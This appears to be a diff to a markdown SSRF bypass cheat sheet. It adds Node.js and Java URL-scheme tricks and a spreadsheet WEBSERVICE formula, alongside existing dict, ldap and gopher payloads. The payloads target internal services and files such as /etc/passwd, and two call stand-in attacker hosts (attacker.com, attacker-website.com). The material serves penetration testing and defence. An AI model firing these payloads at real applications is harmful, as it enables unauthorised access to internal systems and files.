@@ -39,8 +39,9 @@ These bypass approaches work because the application only validates the provided
 
 ## URL scheme
 
-You can try using different URL schemes to bypass the filter:
-```http
+You can try to use different URL schemes:
+
+```bash
 file://path/to/file
 dict://<user>;<auth>@<host>:<port>/d:<word>:<database>:<n>
 dict://127.0.0.1:1337/stats
@@ -52,6 +53,31 @@ ldaps://127.0.0.1:389/%0astats%0aquit
 ldapi://127.0.0.1:389/%0astats%0aquit
 gopher://attacker-website.com/_SSRF%0ATest!
 ```
+
+### Node.js
+
+Node.js for Windows considers any single letter in a URL scheme as `drive://filepath` and set the protocol to `file://`.
+
+```javascript
+// Node.js (Windows only)
+// the following row will return `file:`
+new URL('l://file').protocol
+```
+
+References:
+- [@PwnFunction tweet](https://twitter.com/PwnFunction/status/1484510976183443464)
+
+### Java
+
+Java's URL will correctly handle the next URLs:
+
+```bash
+url:file:///etc/passwd
+url:http://127.0.0.1:8080
+```
+
+References:
+- `@phithon_xg` tweets [1](https://twitter.com/phithon_xg/status/1499414715033735169) and [2](https://twitter.com/phithon_xg/status/1498153253350961152)
 
 ## IP address formats
 
@@ -270,6 +296,17 @@ References:
 - [Write up: Exploiting HTML-to-PDF Converters through HTML Imports](https://mhmdiaa.com/blog/exploiting-html-imports/)
 - [Report: Blind SSRF/XSPA on dashboard.lob.com + blind code injection](https://hackerone.com/reports/517461)
 - [Report: Bypassing HTML filter in "Packing Slip Template" Lead to SSRF to Internal Kubernetes Endpoints](https://hackerone.com/reports/1115139)
+
+# Spreadsheet exporting
+
+If an application is running on a Windows server and exporting to a spreadsheet try to use [WEBSERVICE](https://support.microsoft.com/en-us/office/webservice-function-0546a35a-ecc6-4739-aed7-c0b7ce1562c4) function to gain a SSRF:
+
+```
+=WEBSERVICE('https://attacker.com')
+```
+
+References:
+- [@intigriti tweet](https://twitter.com/intigriti/status/1500088756132589570)
 
 # Request splitting
 
